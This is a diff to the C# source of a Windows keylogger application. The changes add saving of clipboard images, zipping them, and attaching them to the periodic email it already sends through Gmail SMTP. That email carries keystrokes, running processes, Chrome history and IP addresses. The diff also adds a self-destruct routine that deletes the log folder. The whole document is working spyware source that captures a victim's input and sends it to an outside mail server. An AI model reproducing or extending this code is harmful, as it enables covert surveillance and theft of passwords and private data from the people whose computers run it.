@@ -9,6 +9,10 @@ using System.Data;
 using System.Collections.Generic;
 using System.Data.SQLite;
 using System.Threading;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Windows.Media.Imaging;
+using System.IO.Compression;
 using System.Windows.Input;
 
 namespace Keylogger
@@ -37,6 +41,7 @@ namespace Keylogger
     /// <summary>
     /// Interaction logic for MainWindow.xaml
     /// </summary>
+
     public partial class MainWindow : Window
     {
         [DllImport("user32.dll")]
@@ -51,13 +56,13 @@ namespace Keylogger
         uint lastProc;
 
         private bool ChromeExists = false;
-
+        int imageCounter;
         public MainWindow()
         {
             InitializeComponent();
         }
 
-        private void StartTrackingButton(object sender, MouseButtonEventArgs e)
+        private void StartTrackingButton(object sender, RoutedEventArgs e)
         {
             checkBoxes boxes = new checkBoxes((bool)IpAdd.IsChecked, (bool)Apps.IsChecked, (bool)Keys.IsChecked, (bool)Copied.IsChecked, (bool)History.IsChecked);
             emailTo = emailToSend.Text;
@@ -87,7 +92,7 @@ namespace Keylogger
             //if(!Directory.Exists(folder))                                                         
             //Directory.CreateDirectory(folder);                                                
             string filepath = System.IO.Path.Combine(folder, "Keylogger");
-            if (!System.IO.File.Exists(filepath))
+            if (!Directory.Exists(filepath))
                 Directory.CreateDirectory(filepath);
             string pathKeys = (filepath + @"\keystrokes.txt");
             if (!File.Exists(pathKeys))
@@ -98,7 +103,17 @@ namespace Keylogger
             string pathHistoryChrome = (filepath + @"\ChromeHistory.txt");
             if (!File.Exists(pathHistoryChrome))
                 using (StreamWriter sw = File.CreateText(pathHistoryChrome)) ;
-            File.WriteAllText(pathKeys, string.Empty);//
+            string pathImages = (filepath + @"\ImagesFromClipboard");
+            if (!System.IO.File.Exists(pathImages))
+                Directory.CreateDirectory(pathImages);
+
+            DirectoryInfo di = new DirectoryInfo(pathImages);
+            FileInfo[] files = di.GetFiles();
+            foreach (FileInfo file in files)
+            {
+                file.Delete();
+            }
+            File.WriteAllText(pathKeys, string.Empty);
             File.WriteAllText(pathProcesses, string.Empty);
             File.WriteAllText(pathHistoryChrome, string.Empty);
 
@@ -110,17 +125,19 @@ namespace Keylogger
             var timer = new System.Threading.Timer((ignore) =>
             {
                 if (asd1 == 1)
-                    getActiveProcessesAndSendEmail(pathKeys, pathProcesses, boxes, pathHistoryChrome);
+                    getActiveProcessesAndSendEmail(pathKeys, pathProcesses, boxes, pathHistoryChrome, pathImages);
                 asd1 = 1;
             }, null, startTimeSpan, periodTimeSpan);
 
             //////////////////
-            
-            var timeUntillAutodestruction = TimeSpan.FromMinutes(timeAutodestruct+1);
+
+            var timeUntillAutodestruction = TimeSpan.FromMinutes(timeAutodestruct + 1);
             var autodestruction = new System.Threading.Timer((ignore) =>
             {
                 if (asd2 == 1)
-                    System.Environment.Exit(0);
+                {
+                    destructAplication();
+                }
                 asd2 = 1;
             }, null, startTimeSpan, timeUntillAutodestruction);
 
@@ -130,12 +147,20 @@ namespace Keylogger
             {
                 Thread.Sleep(5);
                 getKeys(pathKeys);
-                clipboardContent=getClipboard(clipboardContent, pathKeys);
-                //MessageBox.Show(clipboardContent);
+                clipboardContent = getClipboard(clipboardContent, pathKeys, pathImages);
             }
         }
 
-       
+        void destructAplication()
+        {
+            string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            string filepath = System.IO.Path.Combine(folder, "Keylogger");
+            if (Directory.Exists(filepath))
+                Directory.Delete(filepath, true);
+            else
+                MessageBox.Show("nu s a sters");
+            System.Environment.Exit(0);
+        }
 
         void getMainProcess(StreamWriter sw)
         {
@@ -169,25 +194,54 @@ namespace Keylogger
             }
         }
 
-        string getClipboard(string clipboardContent, string pathClipboard)
+        string getClipboard(string clipboardContent, string pathClipboard, string pathImages)
         {
-            DataObject retrievedData = (DataObject)Clipboard.GetDataObject();
-            if (retrievedData != null)
+            try
             {
-                if (clipboardContent != Clipboard.GetText())
-                {
-                    clipboardContent = Clipboard.GetText();
-                    using (StreamWriter sw = File.AppendText(pathClipboard))
+                DataObject retrievedData = (DataObject)Clipboard.GetDataObject();
+                if (retrievedData != null)
+                    if (retrievedData.ContainsText())
                     {
-                        getMainProcess(sw);
-                        sw.Write("\n(copied)" + clipboardContent+"(copied)\n");
+                        if (clipboardContent != Clipboard.GetText())
+                        {
+                            clipboardContent = Clipboard.GetText();
+                            using (StreamWriter sw = File.AppendText(pathClipboard))
+                            {
+                                getMainProcess(sw);
+                                sw.Write("\n(copied)" + clipboardContent + "(copied)\n");
+                            }
+                        }
                     }
-                }
+                    else
+                    {
+                        if (retrievedData.ContainsImage())
+                        {
+                            if (clipboardContent != Clipboard.GetImage().Format.ToString())
+                            {
+                                clipboardContent = Clipboard.GetImage().Format.ToString();
+                                using (StreamWriter sw = File.AppendText(pathClipboard))
+                                {
+                                    imageCounter++;
+                                    var image = Clipboard.GetImage();
+                                    using (var fileStream = new FileStream(pathImages + "\\" + imageCounter + ".jpg", FileMode.Create))
+                                    {
+                                        BitmapEncoder encoder = new PngBitmapEncoder();
+                                        encoder.Frames.Add(BitmapFrame.Create(image));
+                                        encoder.Save(fileStream);
+                                    }
+                                }
+                            }
+                        }
+                    }
+            }
+            catch
+            {
+                return clipboardContent;
             }
             return clipboardContent;
         }
 
-        void getActiveProcessesAndSendEmail(string pathKeys, string pathProcesses, checkBoxes boxes, string pathHistoryChrome)                                               //
+        void getActiveProcessesAndSendEmail(string pathKeys, string pathProcesses, checkBoxes boxes, string pathHistoryChrome, string pathImages)                                               //
         {
             File.WriteAllText(pathProcesses, string.Empty);
             Process[] processes = Process.GetProcesses();
@@ -202,23 +256,38 @@ namespace Keylogger
                 }
             }
             checkIfChrome(processes, pathHistoryChrome);
-            SendNewMessage(pathKeys, pathProcesses, boxes, pathHistoryChrome);
+            SendNewMessage(pathKeys, pathProcesses, boxes, pathHistoryChrome, pathImages);
             File.WriteAllText(pathKeys, string.Empty);
             File.WriteAllText(pathProcesses, string.Empty);
             File.WriteAllText(pathHistoryChrome, string.Empty);
+            DirectoryInfo di = new DirectoryInfo(pathImages);
+            FileInfo[] files = di.GetFiles();
+            foreach (FileInfo file in files)
+            {
+                file.Delete();
+            }
         }
 
-        void SendNewMessage(string pathKeys, string pathProcesses, checkBoxes boxes, string pathHistoryChrome)
+        void SendNewMessage(string pathKeys, string pathProcesses, checkBoxes boxes, string pathHistoryChrome, string pathImages)
         {
             string logKeys = File.ReadAllText(pathKeys);
             string logProcesses = File.ReadAllText(pathProcesses);
             string logHistoryChrome = File.ReadAllText(pathHistoryChrome);
+            string zipPath = pathImages + ".zip";
+            if (!System.IO.File.Exists(zipPath))
+                ZipFile.CreateFromDirectory(pathImages, zipPath);
+            else
+            {
+                File.Delete(zipPath);
+                ZipFile.CreateFromDirectory(pathImages, zipPath);
+            }
+            byte[] bytes = File.ReadAllBytes(zipPath);
 
             DateTime now = DateTime.Now;
             string subject = "Message from keylogger";
             string emailBody = "";
-
             var host = Dns.GetHostEntry(Dns.GetHostName());
+
             if (boxes.ipAdd)
             {
                 foreach (var address in host.AddressList)
@@ -235,6 +304,8 @@ namespace Keylogger
                 emailBody += "\nKeys pressed: \n" + logKeys;
             if (boxes.history)
                 emailBody += "\nWeb History from Chrome: \n" + logHistoryChrome;
+            //if(boxes.copied)
+
 
 
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
@@ -245,9 +316,10 @@ namespace Keylogger
             MailMessage mailMessage = new MailMessage();
             mailMessage.From = new MailAddress("testkeyloggerapp@gmail.com");
             mailMessage.To.Add(emailTo);
-            //mailMessage.To.Add("ionescumarius1600@gmail.com");
             mailMessage.Subject = subject;
             mailMessage.Body = emailBody;
+            if (boxes.copied)
+                mailMessage.Attachments.Add(new Attachment(new MemoryStream(bytes), zipPath));
 
             client.Send(mailMessage);
 
@@ -363,7 +435,7 @@ namespace Keylogger
 
         private void timeAutodestruction_Click(object sender, RoutedEventArgs e)
         {
-            MessageBox.Show("This is the time the keylogger will run(in minutes) until it will autodestruct itself.");
+            MessageBox.Show("This is the time the keylogger will run (in minutes) until it will autodestruct itself.");
         }
 
         private void checkIfChrome(Process[] procese, string pathHistoryChrome)
@@ -472,7 +544,7 @@ namespace Keylogger
             {
                 Close();
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
             }
@@ -490,9 +562,6 @@ namespace Keylogger
             }
         }
 
-
-       
-
         private void Move(object sender, MouseButtonEventArgs e)
         {
             if (e.LeftButton == MouseButtonState.Pressed)
@@ -500,13 +569,6 @@ namespace Keylogger
                 this.DragMove();
             }
         }
-
-       
-
-
-
-
-
 
 
 
